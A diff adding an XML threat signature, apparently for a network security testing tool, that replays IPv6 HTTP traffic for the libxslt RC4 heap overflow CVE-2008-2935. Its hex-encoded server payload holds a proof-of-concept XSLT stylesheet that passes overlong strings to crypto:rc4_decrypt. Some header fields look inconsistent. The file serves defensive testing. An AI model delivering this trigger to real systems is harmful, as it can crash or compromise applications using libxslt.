@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="GNOME Project libxslt Library RC4 Key String Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists a heap based buffer overflow vulnerability in RC4 libxslt libraryextension. The vulnerability is due to a boundary error in handling of strings passed to RC4 encryption/decryption functions. This vulnerability can be exploited using a crafted stylesheet leading to a heap-based buffer overflow, which could allow the attacker to execute arbitrary code with privileges of the application using the libxslt library to perform XSL transformations. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Libxslt"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Libxslt_Libxslt_Libxslt"/>
+      <item value="Libxslt_Libxslt_Desktop"/>
+      <item value="Libxslt_Libxslt_Enterprise_Linux_AS"/>
+      <item value="Libxslt_Libxslt_Enterprise_Linux_Desktop__Workstation_(Client)"/>
+      <item value="Libxslt_Libxslt_Enterprise_Linux_Desktop_Workstation_(Client)"/>
+      <item value="Libxslt_Libxslt_Enterprise_Linux_ES"/>
+      <item value="Libxslt_Libxslt_Enterprise_Linux_Server"/>
+      <item value="Libxslt_Libxslt_Enterprise_Linux_WS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Libxslt_Libxslt_1.1.8_through_1.1.24"/>
+      <item value="Libxslt_Desktop_4.0"/>
+      <item value="Libxslt_Enterprise_Linux_AS_4"/>
+      <item value="Libxslt_Enterprise_Linux_Desktop__Workstation_(Client)_5"/>
+      <item value="Libxslt_Enterprise_Linux_Desktop_Workstation_(Client)_5"/>
+      <item value="Libxslt_Enterprise_Linux_ES_4"/>
+      <item value="Libxslt_Enterprise_Linux_Server_5"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20080731-09"/>
+    <CVEID display="true" value="CVE-2008-2935"/>
+    <bugtraqID display="true" value="30467"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="bc5bf0800d0d1a524d66019bc959ecf2"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="Partial"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1236795689"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1219718292" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="J"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="L"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="N"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="F">
+      <for index="J"/>
+      <for index="K"/>
+      <for index="M"/>
+      <for index="L"/>
+      <for index="N"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="1035" destPort="$HTTPdestPort" SeqNumber="4AA18740" AckNumber="79CBE256" HeaderLength="05" WindowSize="FFFF" Checksum="459B" UrgentPointer="0000" Options="" Payload="474554202F7E6D626F68696F2F706F632E78736C20485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E30290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="$sourceIP">
+          <TCP srcPort="$HTTPdestPort" destPort="" SeqNumber="79CBE256" AckNumber="4AA18892" HeaderLength="05" WindowSize="1920" Checksum="2985" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C2030352041756720323030382031383A35343A333020474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205475652C2030352041756720323030382031383A34373A313520474D540D0A455461673A20223333303032352D3436352D34353362616532373233326330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20313132350D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F786D6C0D0A0D0A3C78736C3A7374796C6573686565742076657273696F6E3D22312E30220D0A20202020202020202020202020202020786D6C6E733A78736C3D22687474703A2F2F7777772E77332E6F72672F313939392F58534C2F5472616E73666F726D220D0A20202020202020202020202020202020786D6C6E733D22687474703A2F2F7777772E77332E6F72672F54522F7868746D6C312F737472696374220D0A20202020202020202020202020202020786D6C6E733A7374723D22687474703A2F2F6578736C742E6F72672F737472696E6773220D0A20202020202020202020202020202020786D6C6E733A63727970746F3D22687474703A2F2F6578736C742E6F72672F63727970746F220D0A20202020202020202020202020202020786D6C6E733A6D6174683D22687474703A2F2F6578736C742E6F72672F6D617468220D0A20202020202020202020202020202020657874656E73696F6E2D656C656D656E742D70726566697865733D227374722063727970746F206D617468223E0D0A3C78736C3A74656D706C617465206D617463683D222F223E0D0A3C78736C3A76616C75652D6F662073656C6563743D2263727970746F3A7263345F6465637279707428274141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141272C202741414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412729222F3E0D0A0D0A3C68746D6C3E0D0A20203C686561643E0D0A202020203C7469746C653E50726F6F66206F6620436F6E636574703C2F7469746C653E0D0A20203C2F686561643E0D0A0D0A20203C626F64793E0D0A20203C62723E50726F6F66206F6620436F6E636570742074656D706C6174653C2F62723E20436F70797269676874204173737572656E742053656375726520546563686E6F6C6F676965732C20612054656C757320436F6D70616E79203C62723E20416C6C20526967687473205265736572766564203C2F62723E200D0A0D0A20203C2F626F64793E0D0A3C2F68746D6C3E0D0A3C2F78736C3A74656D706C6174653E0D0A3C2F78736C3A7374796C6573686565743E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
